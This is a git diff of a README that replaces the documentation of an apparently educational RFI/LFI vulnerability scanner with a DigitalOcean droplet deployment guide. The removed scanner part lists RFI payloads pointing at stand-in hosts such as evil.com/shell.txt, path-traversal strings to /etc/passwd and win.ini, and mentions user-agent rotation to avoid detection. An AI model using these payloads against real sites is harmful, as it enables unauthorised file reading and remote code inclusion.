@@ -1,184 +1,330 @@
-# Modern RFI/LFI Scanner
+# 🚀 DigitalOcean Droplet One-Shot Deployment
 
-A modernized, educational security tool for detecting Remote File Inclusion (RFI) and Local File Inclusion (LFI) vulnerabilities in web applications.
+> **"Can't break it" production server setup** - Destroy and rebuild your entire infrastructure in 60 seconds with identical configuration every time.
 
-## ⚠️ IMPORTANT WARNING
+This repository contains everything you need to deploy a hardened, production-ready DigitalOcean Droplet with Docker, Node.js, PM2, and automatic security updates. The entire setup is **idempotent** - run it as many times as you want, you'll get the same result.
 
-**This tool is for EDUCATIONAL PURPOSES ONLY. It should only be used on systems you own or have explicit written permission to test. Unauthorized scanning of systems is illegal in many jurisdictions and may result in criminal charges.**
+## ✨ Features
 
-## Features
+- **🔒 Security First**: UFW firewall, Fail2Ban, automatic security updates
+- **🐳 Docker Ready**: Pre-installed Docker and Docker Compose
+- **📦 Node.js Stack**: Node.js, npm, PM2 for process management
+- **🔄 Fully Idempotent**: Destroy and rebuild gets you the exact same server
+- **⚡ One Command Deploy**: Single command to create and configure everything
+- **🎯 Zero Manual Setup**: Everything configured via cloud-init
+- **📝 Infrastructure as Code**: Version control your entire server setup
 
-- **Modern Python Implementation**: Written in Python 3.8+ with async/await for better performance
-- **Multiple Scan Types**: Supports both RFI and LFI vulnerability scanning
-- **Concurrent Scanning**: Configurable concurrent connections for faster scanning
-- **Comprehensive Reporting**: JSON and text-based reports with detailed vulnerability information
-- **User Agent Rotation**: Built-in user agent rotation to avoid detection
-- **Error Handling**: Robust error handling and logging
-- **Rate Limiting**: Built-in rate limiting to avoid overwhelming target servers
+## 📋 Prerequisites
 
-## Installation
+1. **DigitalOcean Account** with API token
+2. **doctl CLI** installed ([Installation Guide](https://docs.digitalocean.com/reference/doctl/how-to/install/))
+3. **SSH Key** generated and added to DigitalOcean
 
-1. **Clone or download the repository**
-2. **Install Python dependencies**:
-   ```bash
-   pip install -r requirements.txt
-   ```
+## 🚀 Quick Start
 
-## Usage
-
-### Basic Usage
+### Step 0: Generate SSH Key (if needed)
 
 ```bash
-# Scan a single URL for RFI vulnerabilities
-python modern_rfi_scanner.py --url "http://example.com/page.php?id=" --type rfi
+# Generate a new SSH key
+ssh-keygen -t ed25519 -C "rawr@screenpilot"
 
-# Scan a single URL for LFI vulnerabilities
-python modern_rfi_scanner.py --url "http://example.com/page.php?file=" --type lfi
-
-# Scan multiple targets from a file
-python modern_rfi_scanner.py --targets targets.txt --type rfi
+# View your public key
+cat ~/.ssh/id_ed25519.pub
 ```
 
-### Advanced Usage
+Add this key to:
+1. DigitalOcean: **Settings → Security → SSH Keys**
+2. The `do_cloudinit.yml` file (replace `YOUR_PUBLIC_KEY_HERE`)
+
+### Step 1: Configure Cloud-Init
+
+Edit `do_cloudinit.yml` and add your SSH public key:
+
+```yaml
+ssh_authorized_keys:
+  - ssh-ed25519 AAAAC3NzaC1lZDI1NTE5... # Your actual key here
+```
+
+### Step 2: Deploy the Droplet
 
 ```bash
-# Scan with custom settings
-python modern_rfi_scanner.py \
-    --targets targets.txt \
-    --type rfi \
-    --concurrent 20 \
-    --timeout 15 \
-    --output results.json \
-    --verbose
+# Authenticate with DigitalOcean
+doctl auth init
+
+# Deploy the Droplet
+./deploy.sh
 ```
 
-### Command Line Options
+That's it! Your server will be ready in ~2-3 minutes.
 
-- `--targets FILE`: File containing target URLs (one per line)
-- `--url URL`: Single target URL to scan
-- `--type {rfi,lfi}`: Type of vulnerability to scan for (default: rfi)
-- `--concurrent N`: Maximum concurrent connections (default: 10)
-- `--timeout N`: Request timeout in seconds (default: 10)
-- `--output FILE`: Output file for results (default: scan_results.json)
-- `--verbose, -v`: Enable verbose output
-- `--help, -h`: Show help message
+### Step 3: Deploy Your Application
 
-## Input File Format
+```bash
+# Quick deploy from GitHub
+./scripts/quick-deploy.sh https://github.com/YOUR_USERNAME/YOUR_REPO.git
 
-Create a text file with target URLs, one per line:
-
-```
-http://example1.com/page.php?id=
-http://example2.com/index.php?page=
-http://example3.com/view.php?file=
+# Or manually
+ssh rawr@YOUR_DROPLET_IP "git clone https://github.com/YOUR/REPO.git && cd REPO && pm2 start"
 ```
 
-## Output
+## 📁 Project Structure
 
-The scanner generates two types of output:
+```
+.
+├── do_cloudinit.yml          # Cloud-init configuration (THE MAGIC FILE)
+├── deploy.sh                 # Main deployment script
+├── ecosystem.config.js       # PM2 configuration template
+├── scripts/
+│   ├── destroy-and-rebuild.sh   # Destroy and recreate Droplet
+│   ├── quick-deploy.sh          # Deploy application to Droplet
+│   └── setup-ssl.sh             # Configure SSL with Let's Encrypt
+└── .github/
+    └── workflows/
+        └── deploy.yml        # GitHub Actions auto-deployment
+```
 
-1. **JSON Report** (`scan_results.json`): Machine-readable format with detailed scan results
-2. **Console Output**: Human-readable summary and vulnerable targets
+## 🔧 Configuration
 
-### Sample JSON Output
+### Cloud-Init Features
 
-```json
-{
-  "scan_summary": {
-    "total_scanned": 50,
-    "vulnerable_found": 3,
-    "scan_type": "RFI/LFI",
-    "timestamp": "2024-01-15 14:30:25"
-  },
-  "vulnerable_targets": [
-    {
-      "url": "http://example.com/page.php?id=http://evil.com/shell.txt?",
-      "payload": "http://evil.com/shell.txt?",
-      "response_code": 200,
-      "response_preview": "root:x:0:0:root:/root:/bin/bash...",
-      "scan_time": 1.23
-    }
-  ]
+The `do_cloudinit.yml` file configures:
+
+- ✅ Non-root user (`rawr`) with sudo access
+- ✅ UFW firewall (ports 22, 80, 443, 3000)
+- ✅ Fail2Ban for brute-force protection
+- ✅ Docker and Docker Compose
+- ✅ Node.js and PM2
+- ✅ Automatic security updates
+- ✅ 2GB swap file
+- ✅ Optimized sysctl settings
+
+### Environment Variables
+
+```bash
+# Deployment configuration
+export DROPLET_NAME="screenpilot"
+export REGION="nyc3"
+export SIZE="s-2vcpu-2gb"
+export TAGS="web,prod"
+```
+
+### PM2 Configuration
+
+Edit `ecosystem.config.js` for your application:
+
+```javascript
+module.exports = {
+  apps: [{
+    name: 'app',
+    script: './server.js',
+    instances: 'max',
+    exec_mode: 'cluster'
+  }]
 }
 ```
 
-## Security Considerations
+## 🔄 The "Can't Break It" Workflow
 
-### For Users
-- Only scan systems you own or have explicit permission to test
-- Be aware of local laws regarding security testing
-- Use responsibly and ethically
-- Consider the impact on target systems
+The beauty of this setup is its resilience:
 
-### For System Administrators
-- Implement proper input validation
-- Use allowlists for file inclusion
-- Enable security headers
-- Regular security audits
-- Monitor for suspicious activity
+```bash
+# Something wrong? Just rebuild!
+./scripts/destroy-and-rebuild.sh
 
-## Technical Details
+# 60 seconds later, you have an identical fresh server
+./scripts/quick-deploy.sh https://github.com/YOUR/REPO.git
 
-### RFI Detection
-The scanner tests for RFI vulnerabilities by:
-1. Injecting remote URLs as parameters
-2. Checking responses for common indicators
-3. Analyzing response patterns and content
+# Back in business! 🎉
+```
 
-### LFI Detection
-The scanner tests for LFI vulnerabilities by:
-1. Injecting path traversal sequences
-2. Attempting to access system files
-3. Checking for sensitive file content in responses
+## 🌐 DNS Configuration
 
-### Payloads Used
+Point your domain to the Droplet:
 
-**RFI Payloads:**
-- `http://evil.com/shell.txt?`
-- `http://attacker.com/backdoor.php?`
-- `http://malicious.com/exploit.txt?`
+| Type | Host | Value | TTL |
+|------|------|-------|-----|
+| **A** | @ | YOUR_DROPLET_IP | 600 |
+| **CNAME** | www | your-domain.com | 600 |
 
-**LFI Payloads:**
-- `/../../../../../../../../etc/passwd`
-- `/../../../../../../../../windows/win.ini`
-- `/../../../../../../../../etc/hosts`
+## 🔒 SSL Setup
 
-## Comparison with Original Script
+Enable HTTPS with Let's Encrypt:
 
-| Feature | Original Perl Script | Modern Python Script |
-|---------|---------------------|---------------------|
-| Language | Perl | Python 3.8+ |
-| Concurrency | Basic forking | Async/await |
-| Error Handling | Limited | Comprehensive |
-| Reporting | IRC messages | JSON + text reports |
-| User Agents | Static list | Rotating system |
-| Rate Limiting | None | Built-in |
-| Code Quality | Monolithic | Modular OOP |
-| Documentation | Minimal | Comprehensive |
+```bash
+./scripts/setup-ssl.sh your-domain.com your-email@example.com
+```
 
-## Legal and Ethical Use
+This will:
+- Install and configure nginx
+- Obtain SSL certificate from Let's Encrypt
+- Set up auto-renewal
+- Configure security headers
 
-This tool is provided for educational and authorized security testing purposes only. Users are responsible for:
+## 🤖 GitHub Actions Deployment
 
-1. Ensuring they have permission to test target systems
-2. Complying with local laws and regulations
-3. Using the tool responsibly and ethically
-4. Not causing harm or disruption to systems
+### Setup Secrets
 
-## Contributing
+Add these secrets to your GitHub repository:
 
-If you want to contribute to this project:
+1. **DROPLET_IP**: Your Droplet's IP address
+2. **SSH_PRIVATE_KEY**: Your private SSH key
 
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
+```bash
+# Copy your private key
+cat ~/.ssh/id_ed25519
+# Add to GitHub: Settings → Secrets → Actions
+```
 
-## License
+### Auto-Deploy on Push
 
-This project is for educational use only. Please ensure you have proper authorization before using this tool on any systems.
+The included GitHub Actions workflow will:
+1. Run tests
+2. Build your application
+3. Deploy to your Droplet
+4. Run health checks
 
-## Disclaimer
+## 📊 Monitoring
 
-The authors and contributors are not responsible for any misuse of this tool. Users are solely responsible for ensuring they have proper authorization and comply with applicable laws when using this software.
+### View Logs
+
+```bash
+# Application logs
+ssh rawr@YOUR_IP "pm2 logs"
+
+# System logs
+ssh rawr@YOUR_IP "sudo journalctl -f"
+
+# Nginx logs
+ssh rawr@YOUR_IP "sudo tail -f /var/log/nginx/access.log"
+```
+
+### Monitor Resources
+
+```bash
+# PM2 monitoring
+ssh rawr@YOUR_IP "pm2 monit"
+
+# System resources
+ssh rawr@YOUR_IP "htop"
+
+# Docker containers
+ssh rawr@YOUR_IP "docker ps"
+```
+
+## 🛠️ Troubleshooting
+
+### Check Cloud-Init Status
+
+```bash
+ssh rawr@YOUR_IP "cloud-init status --wait"
+ssh rawr@YOUR_IP "sudo cat /var/log/cloud-init-output.log"
+```
+
+### Restart Services
+
+```bash
+# Restart application
+ssh rawr@YOUR_IP "pm2 restart all"
+
+# Restart nginx
+ssh rawr@YOUR_IP "sudo systemctl restart nginx"
+
+# Restart Docker
+ssh rawr@YOUR_IP "sudo systemctl restart docker"
+```
+
+### Common Issues
+
+| Issue | Solution |
+|-------|----------|
+| Can't SSH | Wait 2-3 minutes for cloud-init to complete |
+| Port 3000 blocked | Check UFW: `sudo ufw status` |
+| PM2 not starting | Check logs: `pm2 logs` |
+| SSL fails | Ensure DNS is pointed correctly |
+
+## 🚀 Advanced Usage
+
+### Multiple Environments
+
+```bash
+# Production
+DROPLET_NAME=prod-app REGION=nyc3 ./deploy.sh
+
+# Staging
+DROPLET_NAME=staging-app REGION=sfo3 SIZE=s-1vcpu-1gb ./deploy.sh
+```
+
+### Custom Droplet Sizes
+
+Available sizes:
+- `s-1vcpu-1gb` - $6/month
+- `s-2vcpu-2gb` - $18/month (recommended)
+- `s-2vcpu-4gb` - $24/month
+- `s-4vcpu-8gb` - $48/month
+
+### Adding Services
+
+Edit `do_cloudinit.yml` to add more services:
+
+```yaml
+packages:
+  - postgresql
+  - redis-server
+  - elasticsearch
+
+runcmd:
+  - systemctl enable --now postgresql
+  - systemctl enable --now redis-server
+```
+
+## 🔐 Security Best Practices
+
+This setup implements:
+
+1. **Non-root user** with sudo privileges
+2. **SSH key-only** authentication
+3. **UFW firewall** with minimal open ports
+4. **Fail2Ban** to prevent brute-force attacks
+5. **Automatic security updates**
+6. **Regular system updates** via unattended-upgrades
+
+## 📝 License
+
+MIT - Use this however you want!
+
+## 🤝 Contributing
+
+Found a bug or want to add a feature? PRs welcome!
+
+## 💬 Support
+
+- Create an issue for bugs
+- Star the repo if you find it useful
+- Fork and customize for your needs
+
+---
+
+## 🎯 One-Liner Deployment Commands
+
+```bash
+# First time setup
+doctl auth init && ./deploy.sh
+
+# Deploy app
+ssh rawr@$(cat .droplet_ip) "git clone YOUR_REPO && cd YOUR_REPO && pm2 start"
+
+# Rebuild everything
+./scripts/destroy-and-rebuild.sh
+
+# Setup SSL
+./scripts/setup-ssl.sh your-domain.com
+
+# View logs
+ssh rawr@$(cat .droplet_ip) "pm2 logs"
+```
+
+---
+
+**Remember**: The entire configuration lives in `do_cloudinit.yml`. Edit that file, destroy the Droplet, recreate it, and you're back to an identical setup. No manual configuration needed, ever! 🚀
+
+Built with ❤️ for developers who value simplicity and reliability.
